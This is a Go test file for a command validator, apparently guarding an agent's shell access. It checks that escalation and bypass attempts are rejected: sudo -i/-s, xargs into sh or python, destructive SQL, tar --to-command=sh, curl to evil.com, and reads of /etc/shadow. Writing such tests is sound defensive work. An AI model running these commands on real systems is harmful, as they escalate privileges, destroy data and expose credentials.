package validator

import (
	"strings"
	"testing"

	"github.com/jonchun/shellguard/parser"
)

// validatePiped constructs a pipeline with pipe operator between segments.
// Use for testing xargs which requires operator="|".
func validatePiped(t *testing.T, segments ...parser.PipelineSegment) error {
	t.Helper()
	p := &parser.Pipeline{Segments: segments}
	return ValidatePipeline(p, testRegistry(t))
}

func expectReject(t *testing.T, err error, desc string) {
	t.Helper()
	if err == nil {
		t.Errorf("BYPASS: %s — expected rejection but command was allowed", desc)
	}
}

func expectAllow(t *testing.T, err error, desc string) {
	t.Helper()
	if err != nil {
		t.Errorf("FALSE POSITIVE: %s — expected allowed but got: %v", desc, err)
	}
}

// ATTACK VECTOR 1: sudo escalation tricks
//
// The validator only supports `sudo` (bare) and `sudo -u <user> <cmd>`.
// Any other sudo flag is explicitly rejected with a clear error message.
// This is enforced by design: validateSudo rejects any argument starting
// with "-" (other than "-u") before the inner command is reached.

func TestSudoEscalation(t *testing.T) {
	tests := []struct {
		name string
		args []string
		desc string
	}{
		{
			name: "sudo_dash_i_login_shell",
			args: []string{"-i"},
			desc: "sudo -i opens a root login shell",
		},
		{
			name: "sudo_dash_s_shell",
			args: []string{"-s"},
			desc: "sudo -s opens a root shell",
		},
		{
			name: "sudo_dash_e_sudoedit",
			args: []string{"-e", "/etc/passwd"},
			desc: "sudo -e (sudoedit) edits files as root",
		},
		{
			name: "sudo_dash_E_preserve_env",
			args: []string{"-E", "ls", "/tmp"},
			desc: "sudo -E preserves environment (could abuse LD_PRELOAD etc.)",
		},
		{
			name: "sudo_dash_H_set_home",
			args: []string{"-H", "ls", "/tmp"},
			desc: "sudo -H changes HOME directory",
		},
		{
			name: "sudo_double_dash_then_command",
			args: []string{"--", "ls", "/tmp"},
			desc: "sudo -- ls: -- is explicitly rejected as unsupported",
		},
		{
			name: "sudo_dash_i_with_command",
			args: []string{"-i", "whoami"},
			desc: "sudo -i whoami runs command in login shell context",
		},
		{
			name: "sudo_dash_s_with_command",
			args: []string{"-s", "whoami"},
			desc: "sudo -s whoami runs command through a shell",
		},
		{
			name: "sudo_dash_u_with_dash_i",
			args: []string{"-u", "root", "-i"},
			desc: "sudo -u root -i: -u is handled but then -i is rejected as unsupported flag",
		},
		{
			name: "sudo_login_shell_long_form",
			args: []string{"--login"},
			desc: "sudo --login is the long form of -i",
		},
		{
			name: "sudo_shell_long_form",
			args: []string{"--shell"},
			desc: "sudo --shell is the long form of -s",
		},
		{
			name: "sudo_edit_long_form",
			args: []string{"--edit", "/etc/shadow"},
			desc: "sudo --edit is the long form of -e",
		},
		{
			name: "sudo_stdin_password",
			args: []string{"-S", "ls", "/tmp"},
			desc: "sudo -S reads password from stdin",
		},
		{
			name: "sudo_preserve_groups",
			args: []string{"-P", "ls", "/tmp"},
			desc: "sudo -P preserves group vector",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := validateOne(t, "sudo", tc.args...)
			expectReject(t, err, tc.desc)
		})
	}
}

// Verify that sudo -E is explicitly rejected as an unsupported sudo flag
// with a clear, accurate error message.
func TestSudoFlagConfusion_ExplicitRejection(t *testing.T) {
	err := validateOne(t, "sudo", "-E", "ls", "/tmp")
	if err == nil {
		t.Fatal("BYPASS: sudo -E ls /tmp was allowed — -E should be rejected as unsupported flag")
	}
	// Verify the error message explicitly identifies the unsupported flag.
	if !strings.Contains(err.Error(), "-E") {
		t.Errorf("sudo -E rejected but error doesn't mention -E: %v", err)
	}
	if !strings.Contains(err.Error(), "not supported") {
		t.Errorf("sudo -E error should say 'not supported', got: %v", err)
	}
}

// Verify that combined sudo flags are also explicitly rejected.
func TestSudoFlagConfusion_CombinedFlags(t *testing.T) {
	tests := []struct {
		name string
		args []string
	}{
		{"combined_Eu", []string{"-Eu", "user", "ls"}},
		{"combined_sH", []string{"-sH"}},
		{"combined_iE", []string{"-iE", "ls"}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := validateOne(t, "sudo", tc.args...)
			if err == nil {
				t.Fatalf("BYPASS: sudo %v was allowed", tc.args)
			}
			if !strings.Contains(err.Error(), "not supported") {
				t.Errorf("expected 'not supported' in error, got: %v", err)
			}
		})
	}
}

// Verify that long-form sudo flags are explicitly rejected.
func TestSudoFlagConfusion_LongFormFlags(t *testing.T) {
	tests := []struct {
		name string
		args []string
	}{
		{"preserve_env", []string{"--preserve-env", "ls"}},
		{"user_long_form", []string{"--user=root", "ls"}},
		{"login", []string{"--login"}},
		{"shell", []string{"--shell"}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := validateOne(t, "sudo", tc.args...)
			if err == nil {
				t.Fatalf("BYPASS: sudo %v was allowed", tc.args)
			}
			if !strings.Contains(err.Error(), "not supported") {
				t.Errorf("expected 'not supported' in error, got: %v", err)
			}
		})
	}
}

// ATTACK VECTOR 2: xargs injection
//
// xargs validates its inner command against the registry, but certain xargs
// flag combinations could be dangerous.

func TestXargsInjection(t *testing.T) {
	// xargs sh: should reject because 'sh' is denied
	t.Run("xargs_sh", func(t *testing.T) {
		err := validatePiped(t,
			parser.PipelineSegment{Command: "echo", Args: []string{"hello"}},
			parser.PipelineSegment{Command: "xargs", Args: []string{"sh"}, Operator: "|"},
		)
		expectReject(t, err, "xargs sh should be rejected (sh is denied)")
	})

	// xargs bash: should reject
	t.Run("xargs_bash", func(t *testing.T) {
		err := validatePiped(t,
			parser.PipelineSegment{Command: "echo", Args: []string{"hello"}},
			parser.PipelineSegment{Command: "xargs", Args: []string{"bash"}, Operator: "|"},
		)
		expectReject(t, err, "xargs bash should be rejected (bash is denied)")
	})

	// xargs with -a flag (read from file instead of stdin)
	// -a is not in the xargs manifest, so it should be rejected as unrecognized
	t.Run("xargs_dash_a_file", func(t *testing.T) {
		err := validatePiped(t,
			parser.PipelineSegment{Command: "echo", Args: []string{"hello"}},
			parser.PipelineSegment{Command: "xargs", Args: []string{"-a", "/etc/shadow", "cat"}, Operator: "|"},
		)
		expectReject(t, err, "xargs -a reads from arbitrary file")
	})

	// xargs -I {} with shell-injecting placeholder
	// The inner command is validated, but the {} substitution happens at runtime
	t.Run("xargs_I_replacement_with_rm", func(t *testing.T) {
		err := validatePiped(t,
			parser.PipelineSegment{Command: "echo", Args: []string{"/tmp"}},
			parser.PipelineSegment{Command: "xargs", Args: []string{"-I", "{}", "rm", "-rf", "{}"}, Operator: "|"},
		)
		expectReject(t, err, "xargs -I {} rm should be rejected (rm is denied)")
	})

	// xargs python: should reject
	t.Run("xargs_python", func(t *testing.T) {
		err := validatePiped(t,
			parser.PipelineSegment{Command: "echo", Args: []string{"import os; os.system('id')"}},
			parser.PipelineSegment{Command: "xargs", Args: []string{"python"}, Operator: "|"},
		)
		expectReject(t, err, "xargs python should be rejected")
	})

	// xargs without pipe operator: should reject
	t.Run("xargs_no_pipe", func(t *testing.T) {
		err := validateOne(t, "xargs", "ls")
		expectReject(t, err, "xargs without pipe should be rejected")
	})

	// xargs with -P (parallel, denied flag)
	t.Run("xargs_parallel_denied", func(t *testing.T) {
		err := validatePiped(t,
			parser.PipelineSegment{Command: "echo", Args: []string{"hello"}},
			parser.PipelineSegment{Command: "xargs", Args: []string{"-P", "4", "ls"}, Operator: "|"},
		)
		expectReject(t, err, "xargs -P is a denied flag")
	})

	// xargs with no inner command: should reject
	t.Run("xargs_no_command", func(t *testing.T) {
		err := validatePiped(t,
			parser.PipelineSegment{Command: "echo", Args: []string{"hello"}},
			parser.PipelineSegment{Command: "xargs", Args: []string{"-n", "1"}, Operator: "|"},
		)
		expectReject(t, err, "xargs with only flags and no command")
	})

	// xargs valid usage: should pass
	t.Run("xargs_valid_ls", func(t *testing.T) {
		err := validatePiped(t,
			parser.PipelineSegment{Command: "find", Args: []string{"/tmp", "-name", "*.log"}},
			parser.PipelineSegment{Command: "xargs", Args: []string{"ls", "-l"}, Operator: "|"},
		)
		expectAllow(t, err, "xargs ls -l via pipe")
	})

}

// ATTACK VECTOR 3: SQL injection in psql -c
//
// The SQL validator allows SELECT, EXPLAIN, SHOW, WITH, and psql backslash
// commands. It blocks multiple statements via semicolon check and checks
// for allowed prefixes. Let's test edge cases.

func TestSQLInjection(t *testing.T) {
	// --- Should be REJECTED ---

	t.Run("INSERT_statement", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "INSERT INTO users VALUES (1, 'evil')")
		expectReject(t, err, "INSERT is not read-only")
	})

	t.Run("UPDATE_statement", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "UPDATE users SET admin=true")
		expectReject(t, err, "UPDATE is not read-only")
	})

	t.Run("DELETE_statement", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "DELETE FROM users")
		expectReject(t, err, "DELETE is not read-only")
	})

	t.Run("DROP_TABLE", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "DROP TABLE users")
		expectReject(t, err, "DROP TABLE is destructive")
	})

	t.Run("TRUNCATE", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "TRUNCATE users")
		expectReject(t, err, "TRUNCATE is destructive")
	})

	t.Run("ALTER_TABLE", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "ALTER TABLE users ADD COLUMN evil text")
		expectReject(t, err, "ALTER TABLE modifies schema")
	})

	t.Run("CREATE_TABLE", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "CREATE TABLE evil (id int)")
		expectReject(t, err, "CREATE TABLE modifies schema")
	})

	t.Run("CREATE_FUNCTION", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "CREATE FUNCTION evil() RETURNS void AS $$ BEGIN PERFORM pg_sleep(999); END; $$ LANGUAGE plpgsql")
		expectReject(t, err, "CREATE FUNCTION is dangerous")
	})

	t.Run("COPY_TO_file", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "COPY users TO '/tmp/dump.csv'")
		expectReject(t, err, "COPY TO writes data to files on the server")
	})

	t.Run("COPY_FROM_file", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "COPY users FROM '/tmp/evil.csv'")
		expectReject(t, err, "COPY FROM loads data from files")
	})

	t.Run("multiple_statements_semicolon", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "SELECT 1; DROP TABLE users")
		expectReject(t, err, "multiple statements via semicolon")
	})

	t.Run("GRANT_privileges", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "GRANT ALL ON users TO evil")
		expectReject(t, err, "GRANT modifies privileges")
	})

	t.Run("REVOKE_privileges", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "REVOKE ALL ON users FROM admin")
		expectReject(t, err, "REVOKE modifies privileges")
	})

	// Case sensitivity
	t.Run("select_lowercase", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "select 1")
		expectAllow(t, err, "lowercase SELECT should be allowed")
	})

	t.Run("drop_mixed_case", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "DrOp TaBlE users")
		expectReject(t, err, "mixed case DROP should still be rejected")
	})

	// Whitespace before statement
	t.Run("leading_whitespace_delete", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "   DELETE FROM users")
		expectReject(t, err, "leading whitespace should not bypass prefix check")
	})

	// Empty SQL
	t.Run("empty_sql", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "")
		expectReject(t, err, "empty SQL should be rejected")
	})

	t.Run("whitespace_only_sql", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "   ")
		expectReject(t, err, "whitespace-only SQL should be rejected")
	})

	// psql backslash commands — valid
	t.Run("backslash_dt", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "\\dt")
		expectAllow(t, err, "\\dt is an allowed psql metacommand")
	})

	// psql --command= long form for -c
	// The psql manifest only has "-c", not "--command". So --command=
	// satisfies the requires-C check (validatePsqlRequiresC) but then
	// fails as an unrecognized flag. This means the SQL content is NOT
	// validated — the rejection is for the wrong reason.
	t.Run("psql_long_form_command_rejected_as_unrecognized", func(t *testing.T) {
		err := validateOne(t, "psql", "--command=SELECT 1")
		// This is rejected because --command is not in the manifest (only -c is).
		// Safe outcome, but the SQL is never validated.
		expectReject(t, err, "psql --command= not in manifest — rejected as unrecognized flag")
	})

	// If someone adds --command to the manifest later, they'd need to ensure
	// SQL validation still fires. Currently only flag "-c" triggers validateSQL.
	t.Run("psql_long_form_command_with_dangerous_sql", func(t *testing.T) {
		err := validateOne(t, "psql", "--command=DELETE FROM users")
		// Also rejected as unrecognized flag (not as dangerous SQL)
		expectReject(t, err, "psql --command= with dangerous SQL — rejected but for wrong reason")
	})

	// CREATE TABLE AS SELECT
	t.Run("CREATE_TABLE_AS_SELECT", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "CREATE TABLE evil AS SELECT * FROM users")
		expectReject(t, err, "CREATE TABLE AS SELECT should be rejected")
	})

	// DO block — executes anonymous PL/pgSQL
	t.Run("DO_block", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "DO $$ BEGIN EXECUTE 'DROP TABLE users'; END $$")
		expectReject(t, err, "DO blocks execute arbitrary PL/pgSQL")
	})

	// VACUUM — maintenance that can lock tables
	t.Run("VACUUM", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "VACUUM users")
		expectReject(t, err, "VACUUM should be rejected")
	})

	// REINDEX
	t.Run("REINDEX", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "REINDEX TABLE users")
		expectReject(t, err, "REINDEX should be rejected")
	})

	// CLUSTER
	t.Run("CLUSTER", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "CLUSTER users")
		expectReject(t, err, "CLUSTER should be rejected")
	})

	// SET — changes session config
	t.Run("SET_statement", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "SET search_path TO evil_schema")
		// "SET" doesn't match any allowed prefix
		expectReject(t, err, "SET should be rejected")
	})

	// LISTEN/NOTIFY
	t.Run("LISTEN", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "LISTEN evil_channel")
		expectReject(t, err, "LISTEN should be rejected")
	})

	t.Run("NOTIFY", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "NOTIFY evil_channel, 'payload'")
		expectReject(t, err, "NOTIFY should be rejected")
	})
}

// ATTACK VECTOR 4: Subcommand bypass
//
// docker, kubectl, svn, systemctl, aws use subcommand validation.
// The validator builds keys like "docker_exec" and looks them up.
// If no manifest exists, it rejects with "subcommand not available."

func TestSubcommandBypass(t *testing.T) {
	// --- These should all be REJECTED (no manifest registered) ---

	t.Run("docker_exec", func(t *testing.T) {
		err := validateOne(t, "docker", "exec", "-it", "container", "bash")
		expectReject(t, err, "docker exec can run arbitrary commands in containers")
	})

	t.Run("docker_run", func(t *testing.T) {
		err := validateOne(t, "docker", "run", "alpine", "sh")
		expectReject(t, err, "docker run can start arbitrary containers")
	})

	t.Run("docker_cp", func(t *testing.T) {
		err := validateOne(t, "docker", "cp", "container:/etc/shadow", "/tmp/")
		expectReject(t, err, "docker cp can copy files from containers")
	})

	t.Run("docker_rm", func(t *testing.T) {
		err := validateOne(t, "docker", "rm", "-f", "container")
		expectReject(t, err, "docker rm removes containers")
	})

	t.Run("docker_stop", func(t *testing.T) {
		err := validateOne(t, "docker", "stop", "container")
		expectReject(t, err, "docker stop halts containers")
	})

	t.Run("docker_build", func(t *testing.T) {
		err := validateOne(t, "docker", "build", ".")
		expectReject(t, err, "docker build can execute arbitrary Dockerfiles")
	})

	t.Run("docker_images", func(t *testing.T) {
		// docker_images has no manifest — should be rejected
		err := validateOne(t, "docker", "images")
		expectReject(t, err, "docker images has no manifest")
	})

	t.Run("kubectl_exec", func(t *testing.T) {
		err := validateOne(t, "kubectl", "exec", "-it", "pod", "--", "bash")
		expectReject(t, err, "kubectl exec can run arbitrary commands in pods")
	})

	t.Run("kubectl_delete", func(t *testing.T) {
		err := validateOne(t, "kubectl", "delete", "pod", "mypod")
		expectReject(t, err, "kubectl delete destroys resources")
	})

	t.Run("kubectl_apply", func(t *testing.T) {
		err := validateOne(t, "kubectl", "apply", "-f", "evil.yaml")
		expectReject(t, err, "kubectl apply creates/modifies resources")
	})

	t.Run("kubectl_edit", func(t *testing.T) {
		err := validateOne(t, "kubectl", "edit", "deployment", "myapp")
		expectReject(t, err, "kubectl edit modifies resources")
	})

	t.Run("kubectl_cp", func(t *testing.T) {
		err := validateOne(t, "kubectl", "cp", "pod:/etc/shadow", "/tmp/")
		expectReject(t, err, "kubectl cp copies files from pods")
	})

	t.Run("kubectl_run", func(t *testing.T) {
		err := validateOne(t, "kubectl", "run", "evil", "--image=alpine", "--", "sh")
		expectReject(t, err, "kubectl run creates new pods")
	})

	t.Run("systemctl_start", func(t *testing.T) {
		err := validateOne(t, "systemctl", "start", "evil.service")
		expectReject(t, err, "systemctl start modifies service state")
	})

	t.Run("systemctl_stop", func(t *testing.T) {
		err := validateOne(t, "systemctl", "stop", "important.service")
		expectReject(t, err, "systemctl stop halts services")
	})

	t.Run("systemctl_restart", func(t *testing.T) {
		err := validateOne(t, "systemctl", "restart", "important.service")
		expectReject(t, err, "systemctl restart disrupts services")
	})

	t.Run("systemctl_enable", func(t *testing.T) {
		err := validateOne(t, "systemctl", "enable", "evil.service")
		expectReject(t, err, "systemctl enable modifies boot config")
	})

	t.Run("systemctl_disable", func(t *testing.T) {
		err := validateOne(t, "systemctl", "disable", "important.service")
		expectReject(t, err, "systemctl disable modifies boot config")
	})

	t.Run("systemctl_mask", func(t *testing.T) {
		err := validateOne(t, "systemctl", "mask", "important.service")
		expectReject(t, err, "systemctl mask prevents service from starting")
	})

	t.Run("systemctl_daemon-reload", func(t *testing.T) {
		err := validateOne(t, "systemctl", "daemon-reload")
		expectReject(t, err, "systemctl daemon-reload reloads systemd config")
	})

	t.Run("svn_checkout", func(t *testing.T) {
		err := validateOne(t, "svn", "checkout", "svn://evil.com/repo")
		expectReject(t, err, "svn checkout writes to filesystem")
	})

	t.Run("svn_commit", func(t *testing.T) {
		err := validateOne(t, "svn", "commit", "-m", "evil")
		expectReject(t, err, "svn commit modifies the repository")
	})

	t.Run("svn_delete", func(t *testing.T) {
		err := validateOne(t, "svn", "delete", "file.txt")
		expectReject(t, err, "svn delete removes files")
	})

	t.Run("aws_s3_cp", func(t *testing.T) {
		err := validateOne(t, "aws", "s3", "cp", "s3://bucket/secret", "/tmp/")
		expectReject(t, err, "aws s3 cp can copy data")
	})

	t.Run("aws_s3_rm", func(t *testing.T) {
		err := validateOne(t, "aws", "s3", "rm", "s3://bucket/file")
		expectReject(t, err, "aws s3 rm deletes objects")
	})

	t.Run("aws_ec2_terminate_instances", func(t *testing.T) {
		err := validateOne(t, "aws", "ec2", "terminate-instances", "--instance-ids", "i-12345")
		expectReject(t, err, "aws ec2 terminate-instances destroys instances")
	})

	t.Run("aws_iam_create_user", func(t *testing.T) {
		err := validateOne(t, "aws", "iam", "create-user", "--user-name", "evil")
		expectReject(t, err, "aws iam create-user creates IAM users")
	})

	// --- These should PASS (manifests exist) ---

	t.Run("docker_ps_allowed", func(t *testing.T) {
		err := validateOne(t, "docker", "ps")
		expectAllow(t, err, "docker ps is allowed")
	})

	t.Run("docker_logs_allowed", func(t *testing.T) {
		err := validateOne(t, "docker", "logs", "--tail", "100", "container")
		expectAllow(t, err, "docker logs is allowed")
	})

	t.Run("docker_inspect_allowed", func(t *testing.T) {
		err := validateOne(t, "docker", "inspect", "container")
		expectAllow(t, err, "docker inspect is allowed")
	})

	t.Run("kubectl_get_allowed", func(t *testing.T) {
		err := validateOne(t, "kubectl", "get", "pods", "-n", "default")
		expectAllow(t, err, "kubectl get is allowed")
	})

	t.Run("kubectl_describe_allowed", func(t *testing.T) {
		err := validateOne(t, "kubectl", "describe", "pod", "mypod")
		expectAllow(t, err, "kubectl describe is allowed")
	})

	t.Run("kubectl_logs_allowed", func(t *testing.T) {
		err := validateOne(t, "kubectl", "logs", "mypod", "--tail", "100")
		expectAllow(t, err, "kubectl logs is allowed")
	})

	t.Run("systemctl_status_allowed", func(t *testing.T) {
		err := validateOne(t, "systemctl", "status", "nginx")
		expectAllow(t, err, "systemctl status is allowed")
	})

	t.Run("aws_ec2_describe_instances_allowed", func(t *testing.T) {
		err := validateOne(t, "aws", "ec2", "describe-instances")
		expectAllow(t, err, "aws ec2 describe-instances is allowed")
	})
}

// ATTACK VECTOR 5: Flag confusion attacks
//
// Combined short flags like -abc are split into -a, -b, -c.
// Can a denied flag be hidden in a combination?

func TestFlagConfusionAttacks(t *testing.T) {
	t.Run("tail_denied_f_hidden_in_fn", func(t *testing.T) {
		// -fn: -f is first, should be caught
		err := validateOne(t, "tail", "-fn", "100", "/var/log/syslog")
		expectReject(t, err, "tail -fn should catch -f as denied")
	})

	// top -d is denied. Try combined flags.
	t.Run("top_denied_d_in_combined", func(t *testing.T) {
		err := validateOne(t, "top", "-bd", "1")
		// -b is allowed (no takes_value), -d is next — should be caught
		expectReject(t, err, "top -bd should catch -d as denied")
	})

	// curl -X is denied. Try combined flags.
	t.Run("curl_denied_X_in_combined", func(t *testing.T) {
		err := validateOne(t, "curl", "-sX", "POST", "http://evil.com")
		// -s is allowed (no takes_value), -X is next
		expectReject(t, err, "curl -sX should catch -X as denied")
	})

	// curl -o is denied. Try --output=value
	t.Run("curl_denied_output_long_form", func(t *testing.T) {
		err := validateOne(t, "curl", "--output=/tmp/evil", "http://example.com")
		expectReject(t, err, "curl --output= long form should be caught")
	})

	// Unzip denied flag -d hidden in combined
	t.Run("unzip_denied_d_in_combined", func(t *testing.T) {
		err := validateOne(t, "unzip", "-ld", "archive.zip")
		// -l is allowed (no takes_value), -d is next
		expectReject(t, err, "unzip -ld should catch -d as denied")
	})

	// Unzip denied flag -o hidden in combined
	t.Run("unzip_denied_o_in_combined", func(t *testing.T) {
		err := validateOne(t, "unzip", "-lo", "archive.zip")
		expectReject(t, err, "unzip -lo should catch -o as denied")
	})

	// find -exec hidden in combined: find flags start with - so combined
	// doesn't apply the same way, but let's test
	t.Run("find_denied_delete_flag", func(t *testing.T) {
		err := validateOne(t, "find", "/tmp", "-delete")
		expectReject(t, err, "find -delete should be denied")
	})

	t.Run("find_denied_exec_flag", func(t *testing.T) {
		err := validateOne(t, "find", "/tmp", "-exec", "rm", "{}", "+")
		expectReject(t, err, "find -exec should be denied")
	})
}

// ATTACK VECTOR 6: tar/unzip bypass
//
// tar requires -O with -x. Can long forms bypass this?
// Can --to-command= or --checkpoint-action= be smuggled in?

func TestTarBypass(t *testing.T) {
	// --extract is the long form of -x. Must also require -O.
	t.Run("tar_long_form_extract_no_stdout", func(t *testing.T) {
		err := validateOne(t, "tar", "--extract", "-f", "archive.tar")
		expectReject(t, err, "tar --extract (long form of -x) without -O should be rejected")
	})

	// --to-command is denied in the manifest
	t.Run("tar_to_command_denied", func(t *testing.T) {
		err := validateOne(t, "tar", "-x", "-O", "-f", "archive.tar", "--to-command=sh")
		expectReject(t, err, "tar --to-command should be denied")
	})

	// --checkpoint-action is denied
	t.Run("tar_checkpoint_action_denied", func(t *testing.T) {
		err := validateOne(t, "tar", "-t", "-f", "archive.tar", "--checkpoint-action=exec=sh")
		expectReject(t, err, "tar --checkpoint-action should be denied")
	})

	// tar -c (create) is denied
	t.Run("tar_create_denied", func(t *testing.T) {
		err := validateOne(t, "tar", "-cf", "evil.tar", "/etc")
		expectReject(t, err, "tar -c (create) should be denied")
	})

	// tar -r (append) is denied
	t.Run("tar_append_denied", func(t *testing.T) {
		err := validateOne(t, "tar", "-rf", "evil.tar", "/etc/passwd")
		expectReject(t, err, "tar -r (append) should be denied")
	})

	// tar --delete is denied
	t.Run("tar_delete_denied", func(t *testing.T) {
		err := validateOne(t, "tar", "--delete", "-f", "archive.tar", "secret.txt")
		expectReject(t, err, "tar --delete should be denied")
	})

	// tar -t (list) should work without -O
	t.Run("tar_list_no_stdout_required", func(t *testing.T) {
		err := validateOne(t, "tar", "-tf", "archive.tar")
		expectAllow(t, err, "tar -t (list) does not require -O")
	})

	// tar -xO should be fine
	t.Run("tar_extract_with_O_combined", func(t *testing.T) {
		// -x is in combined, -O is separate
		err := validateOne(t, "tar", "-xf", "archive.tar", "-O")
		expectAllow(t, err, "tar -xf archive.tar -O should be allowed")
	})
}

func TestUnzipBypass(t *testing.T) {
	// unzip without -l or -p should be rejected
	t.Run("unzip_no_mode", func(t *testing.T) {
		err := validateOne(t, "unzip", "archive.zip")
		expectReject(t, err, "unzip without -l/-p should be rejected")
	})

	// unzip -l should pass
	t.Run("unzip_list_allowed", func(t *testing.T) {
		err := validateOne(t, "unzip", "-l", "archive.zip")
		expectAllow(t, err, "unzip -l should be allowed")
	})

	// unzip -p should pass
	t.Run("unzip_pipe_allowed", func(t *testing.T) {
		err := validateOne(t, "unzip", "-p", "archive.zip")
		expectAllow(t, err, "unzip -p should be allowed")
	})

	// unzip -d is denied (extract to directory)
	t.Run("unzip_extract_to_dir_denied", func(t *testing.T) {
		err := validateOne(t, "unzip", "-l", "-d", "/tmp/evil", "archive.zip")
		expectReject(t, err, "unzip -d should be denied even with -l")
	})
}

// ATTACK VECTOR 7: Path traversal
//
// checkRestrictedPath uses exact match or prefix + "/".
// Can path manipulation bypass this?

func TestPathTraversal(t *testing.T) {
	// Direct restricted path
	t.Run("direct_restricted_path", func(t *testing.T) {
		err := validateOne(t, "find", "/proc/kcore")
		expectReject(t, err, "/proc/kcore is restricted")
	})

	// With subdirectory
	t.Run("restricted_path_subdir", func(t *testing.T) {
		err := validateOne(t, "find", "/proc/kcore/something")
		expectReject(t, err, "/proc/kcore/something should be restricted")
	})

	// Double slash: //proc/kcore — path.Clean normalizes this
	t.Run("double_slash_bypass", func(t *testing.T) {
		err := validateOne(t, "find", "//proc/kcore")
		expectReject(t, err, "//proc/kcore should be caught after path.Clean()")
	})

	// Parent directory traversal: /proc/../proc/kcore
	t.Run("dot_dot_traversal", func(t *testing.T) {
		err := validateOne(t, "find", "/proc/../proc/kcore")
		expectReject(t, err, "/proc/../proc/kcore should be caught after path.Clean()")
	})

	// Current directory: /proc/./kcore
	t.Run("dot_traversal", func(t *testing.T) {
		err := validateOne(t, "find", "/proc/./kcore")
		expectReject(t, err, "/proc/./kcore should be caught after path.Clean()")
	})

	// Trailing slash: /proc/kcore/
	t.Run("trailing_slash", func(t *testing.T) {
		err := validateOne(t, "find", "/proc/kcore/")
		// "/proc/kcore/" has prefix "/proc/kcore/" — this should match
		expectReject(t, err, "/proc/kcore/ should be restricted")
	})

	// Restricted path as a substring of a different path
	t.Run("restricted_path_substring_false_positive", func(t *testing.T) {
		// "/proc/kcore_backup" should NOT be restricted
		// (it doesn't match exact "/proc/kcore" or prefix "/proc/kcore/")
		err := validateOne(t, "find", "/proc/kcore_backup")
		// The check is: arg == restricted || HasPrefix(arg, restricted+"/")
		// "/proc/kcore_backup" != "/proc/kcore" and doesn't have prefix "/proc/kcore/"
		// So this should PASS — which is correct behavior
		expectAllow(t, err, "/proc/kcore_backup is not a restricted path")
	})
}

// ATTACK VECTOR 8: WITH CTE SQL bypass
//
// The CTE validator tracks parenthesis depth and checks the terminal
// statement after the last depth-0 closing paren.

func TestWithCTEBypass(t *testing.T) {
	// Valid CTE with SELECT terminal
	t.Run("valid_cte_select", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "WITH cte AS (SELECT 1) SELECT * FROM cte")
		expectAllow(t, err, "valid CTE with SELECT terminal should be allowed")
	})

	// CTE with DELETE terminal — should be rejected
	t.Run("cte_delete_terminal", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "WITH cte AS (SELECT id FROM users) DELETE FROM users WHERE id IN (SELECT id FROM cte)")
		expectReject(t, err, "CTE with DELETE terminal should be rejected")
	})

	// CTE with INSERT terminal
	t.Run("cte_insert_terminal", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "WITH cte AS (SELECT 1 AS val) INSERT INTO evil SELECT val FROM cte")
		expectReject(t, err, "CTE with INSERT terminal should be rejected")
	})

	// CTE with UPDATE terminal
	t.Run("cte_update_terminal", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "WITH cte AS (SELECT id FROM users) UPDATE users SET admin=true WHERE id IN (SELECT id FROM cte)")
		expectReject(t, err, "CTE with UPDATE terminal should be rejected")
	})

	// Nested CTEs
	t.Run("nested_cte_select", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "WITH a AS (SELECT 1), b AS (SELECT * FROM a) SELECT * FROM b")
		expectAllow(t, err, "nested CTE with SELECT terminal should be allowed")
	})

	// CTE with parentheses in string literals
	t.Run("cte_parens_in_string_literal", func(t *testing.T) {
		err := validateOne(t, "psql", "-c", "WITH cte AS (SELECT '(' AS val) SELECT * FROM cte")
		// The validator tracks single quotes but uses simple toggle logic.
		// This should work correctly since the ( is inside quotes.
		expectAllow(t, err, "CTE with parens in string literal should be allowed")
	})

	// CTE with unbalanced parens in quotes to confuse tracker
	t.Run("cte_unbalanced_parens_in_quotes_then_delete", func(t *testing.T) {
		// The quote tracking toggles on every single quote.
		// If we have an odd number of single-quoted strings with parens,
		// the depth tracker might get confused.
		sql := "WITH cte AS (SELECT ')' AS val) DELETE FROM users"
		err := validateOne(t, "psql", "-c", sql)
		// The ')' in the string should not decrement depth.
		// After the AS (...), the last depth-0 close is the real one.
		// Let's see if the validator correctly identifies DELETE as terminal.
		expectReject(t, err, "CTE with close-paren in string followed by DELETE")
	})

	// Multiple single quotes (escaped quote in PG: '')
	t.Run("cte_escaped_quotes", func(t *testing.T) {
		// In PG, '' is an escaped single quote inside a string
		// The validator's simple toggle will see: open-quote, close-quote (for ''), then next ' opens again
		// "SELECT 'it''s'" — the simple toggle sees: open at 8, close at 11, open at 12, close at 14
		// This actually works correctly for '' because the pairs balance out.
